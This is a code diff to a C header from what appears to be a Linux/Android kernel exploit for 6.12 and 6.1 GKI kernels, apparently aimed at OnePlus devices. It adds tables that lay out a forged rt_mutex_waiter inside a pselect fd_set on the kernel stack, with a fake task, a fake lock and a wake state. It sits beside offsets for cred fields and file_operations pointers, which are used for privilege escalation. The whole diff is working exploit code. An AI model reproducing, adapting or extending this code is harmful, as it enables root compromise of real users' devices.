@@ -37,6 +37,19 @@ struct kernel_offsets {
   uint32_t waiter_tree, waiter_pi_tree, waiter_task, waiter_lock;
   uint32_t waiter_wake_state, waiter_prio, waiter_deadline, waiter_ww_ctx;
   uint32_t waiter_pi_tree_prio, waiter_pi_tree_deadline;
+
+  /* Pselect fake waiter word table.
+   * Each entry: word index in fd_set, value to write.
+   * Value flags: 0 = literal 0, 1 = literal 1 (prio),
+   *              2 = fake_task or init_task, 3 = fake_lock, 4 = wake_state(3).
+   * Terminated by word=-1. */
+  #define WV_ZERO  0
+  #define WV_PRIO  1
+  #define WV_TASK  2
+  #define WV_LOCK  3
+  #define WV_WAKE  4
+  struct { int8_t word; int8_t value_flag; } pselect_words[20];
+
   /* cred */
   uint32_t cred_uid, cred_securebits, cred_caps, cred_security;
   /* file_operations */
@@ -65,6 +78,50 @@ struct kernel_offsets {
   .kernelsnitch_identity_end=0xffffff8300000000ULL, \
   .direct_map_end=0xffffff8300000000ULL
 
+/*
+ * Pselect fake waiter word tables.
+ * word index = position in fd_set (relative to waiter base word).
+ * Each 8-byte word maps to a field in rt_mutex_waiter on the kernel stack.
+ */
+
+/* 6.12: rt_waiter_node (40 bytes each) — prio/deadline nested in tree nodes */
+#define PSELECT_WORDS_6_12 \
+  .pselect_words = { \
+    { 2, WV_ZERO}, /* tree.rb_parent_color */ \
+    { 3, WV_ZERO}, /* tree.rb_right */ \
+    { 4, WV_ZERO}, /* tree.rb_left */ \
+    { 5, WV_PRIO}, /* tree.prio */ \
+    { 6, WV_ZERO}, /* tree.deadline */ \
+    { 7, WV_ZERO}, /* pi_tree.rb_parent_color */ \
+    { 8, WV_ZERO}, /* pi_tree.rb_right */ \
+    { 9, WV_ZERO}, /* pi_tree.rb_left */ \
+    {10, WV_PRIO}, /* pi_tree.prio */ \
+    {11, WV_ZERO}, /* pi_tree.deadline */ \
+    {12, WV_TASK}, /* task */ \
+    {13, WV_LOCK}, /* lock */ \
+    {14, WV_WAKE}, /* wake_state */ \
+    {-1, 0} \
+  }
+
+/* 6.1: rb_node (24 bytes each) — prio/deadline are flat fields.
+ * wake_state(u32) at 0x40 and prio(int) at 0x44 share word 10.
+ * Combined as: low32=wake_state(3), high32=prio(1) → value_flag WV_WAKE_PRIO */
+#define WV_WAKE_PRIO 5
+#define PSELECT_WORDS_6_1 \
+  .pselect_words = { \
+    { 2, WV_ZERO}, /* tree.rb_parent_color */ \
+    { 3, WV_ZERO}, /* tree.rb_right */ \
+    { 4, WV_ZERO}, /* tree.rb_left */ \
+    { 5, WV_ZERO}, /* pi_tree.rb_parent_color */ \
+    { 6, WV_ZERO}, /* pi_tree.rb_right */ \
+    { 7, WV_ZERO}, /* pi_tree.rb_left */ \
+    { 8, WV_TASK}, /* task (at 0x30) */ \
+    { 9, WV_LOCK}, /* lock (at 0x38) */ \
+    {10, WV_WAKE_PRIO}, /* wake_state(0x40) + prio(0x44) packed */ \
+    {11, WV_ZERO}, /* deadline (at 0x48) */ \
+    {-1, 0} \
+  }
+
 /* Struct offset defaults for 6.12 GKI (most OnePlus devices) */
 #define STRUCT_OFFSETS_6_12 \
   .task_usage=0x40, .task_prio=0x94, .task_normal_prio=0x9C, \
@@ -82,7 +139,8 @@ struct kernel_offsets {
   .fops_owner=0x00, .fops_llseek=0x10, .fops_read=0x18, .fops_write=0x20, \
   .fops_read_iter=0x28, .fops_write_iter=0x30, .fops_ioctl=0x50, \
   .fops_compat_ioctl=0x58, .fops_mmap=0x60, .fops_open=0x68, \
-  .fops_release=0x78, .fops_splice_read=0xB8, .fops_show_fdinfo=0xD8
+  .fops_release=0x78, .fops_splice_read=0xB8, .fops_show_fdinfo=0xD8, \
+  PSELECT_WORDS_6_12
 
 /* Struct offset defaults for 6.1 GKI */
 #define STRUCT_OFFSETS_6_1 \
@@ -101,7 +159,8 @@ struct kernel_offsets {
   .fops_owner=0x00, .fops_llseek=0x08, .fops_read=0x10, .fops_write=0x18, \
   .fops_read_iter=0x20, .fops_write_iter=0x28, .fops_ioctl=0x50, \
   .fops_compat_ioctl=0x58, .fops_mmap=0x60, .fops_open=0x70, \
-  .fops_release=0x80, .fops_splice_read=0xC8, .fops_show_fdinfo=0xE0
+  .fops_release=0x80, .fops_splice_read=0xC8, .fops_show_fdinfo=0xE0, \
+  PSELECT_WORDS_6_1
 
 static const struct kernel_offsets known_offsets[] = {
 #include "ace6t/offsets.h"
